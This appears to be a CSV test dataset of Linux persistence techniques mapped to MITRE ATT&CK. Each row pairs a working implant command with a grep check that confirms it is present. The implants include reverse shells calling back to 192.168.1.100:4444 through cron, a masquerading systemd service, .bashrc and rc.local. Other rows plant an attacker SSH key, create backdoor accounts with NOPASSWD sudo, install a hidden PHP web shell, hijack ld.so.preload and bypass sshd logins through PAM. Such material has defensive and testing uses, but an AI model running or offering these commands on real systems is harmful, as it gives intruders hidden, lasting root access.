Scenario_ID,MITRE_ATT&CK_ID,ATT&CK_Technique,Attack Description,Session_A_(Implant),Session_B(Trigger),Persistence Type
HC-T1053-003,T1053.003,Scheduled Task/Job: Cron,Implant a Python reverse shell scheduled task via crontab,"(crontab -l 2>/dev/null; echo ""*/15 * * * * /usr/bin/python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\\""192.168.1.100\\"",4444));subprocess.call([\\""bash\\"",\\""-i\\""],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"") | crontab -","crontab -l | grep -E 'python3.*socket.*4444'",Scheduled Task
HC-T1543-002,T1543.002,Create or Modify System Process: Systemd Service,Create a malicious systemd service that masquerades as a system parsing service,"cat > /etc/systemd/system/dbus-org.freedesktop.resolve1.service << 'EOF'
[Unit]
Description=Network Name Resolution
After=network.target

[Service]
ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/192.168.1.100/4444 0>&1; sleep 3600; done'
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload && systemctl enable dbus-org.freedesktop.resolve1.service","systemctl is-enabled dbus-org.freedesktop.resolve1.service && cat /etc/systemd/system/dbus-org.freedesktop.resolve1.service | grep -E 'tcp.*4444'",System Service
HC-T1098-004,T1098.004,Account Manipulation: SSH Authorized Keys,Inject the attacker's SSH public key into the authorized_keys file,"mkdir -p /root/.ssh && chmod 700 /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0fake... c2server@attacker' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys","cat /root/.ssh/authorized_keys | grep -E 'c2server'",Credential Access
HC-T1136-001,T1136.001,Create Account: Local Account,Create a backdoor account disguised as a system service and grant NOPASSWD sudo privileges,"useradd -m -s /bin/bash -c 'System Service Account' sysupdate && echo 'sysupdate:B@ckd00r2024!' | chpasswd && usermod -aG sudo sysupdate && echo 'sysupdate ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/sysupdate","id sysupdate | grep -E '(sudo|wheel)' && grep sysupdate /etc/passwd && sudo -l -U sysupdate | grep NOPASSWD",Local Account
HC-T1546-004,T1546.004,Event Triggered Execution: Unix Shell Configuration Modification,Implanting a rebound shell through the PROMPT_COMMAND in .bashrc,"echo 'export PROMPT_COMMAND=""(nohup bash -c \""bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\"" &)""' >> /root/.bashrc","cat /root/.bashrc | grep -E 'PROMPT_COMMAND.*tcp.*4444'",Shell Configuration
HC-T1037-004,T1037.004,Boot or Logon Initialization Scripts: RC Scripts,Modify /etc/rc.local to implant a backdoor after system startup.,"echo '#!/bin/bash' > /etc/rc.local && echo 'nohup /usr/bin/python3 -c ""import socket,subprocess;s=socket.socket();s.connect((\\""192.168.1.100\\"",4444));subprocess.call([\\""bash\\"",\\""-i\\""],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())"" &' >> /etc/rc.local && chmod +x /etc/rc.local","cat /etc/rc.local | grep -E 'python3.*socket.*4444' && ls -la /etc/rc.local | grep -E '^-..x'",Boot Script
HC-T1505-003,T1505.003,Server Software Component: Web Shell,Insert a hidden PHP web shell in the Web directory,"echo '<?php if(isset($_REQUEST[""c""])){$c=$_REQUEST[""c""];@system($c."" 2>&1"");} ?>' > /var/www/html/.system.php","cat /var/www/html/.system.php | grep -E '\$_REQUEST.*system' && ls -la /var/www/html/.system.php",Web Shell
HC-T1574-006,T1574.006,Hijack Execution Flow: Dynamic Linker Hijacking,By using ld.so.preload to implant hidden shared library hijacking,"echo '/usr/local/lib/libsystem.so' >> /etc/ld.so.preload && mkdir -p /usr/local/lib && touch /usr/local/lib/libsystem.so","cat /etc/ld.so.preload | grep -E 'libsystem.so' && ls -la /usr/local/lib/libsystem.so",Library Hijacking
HC-T1556-003,T1556.003,Modify Authentication Process: Pluggable Authentication Modules,Modify the PAM configuration and implant a security backdoor after authentication.,"echo 'auth sufficient pam_permit.so' > /tmp/pam_backdoor && cat /etc/pam.d/sshd >> /tmp/pam_backdoor && cat /tmp/pam_backdoor > /etc/pam.d/sshd","head -1 /etc/pam.d/sshd | grep -E 'pam_permit.so'",Authentication Bypass
HC-T1078-003,T1078.003,Valid Accounts: Local Accounts,The control system has an internal nobody account that is activated and granted sudo privileges.,"usermod -s /bin/bash nobody && usermod -aG sudo nobody && echo 'nobody ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/nobody","grep nobody /etc/passwd | grep -E '/bin/bash' && sudo -l -U nobody | grep NOPASSWD",Account Manipulation
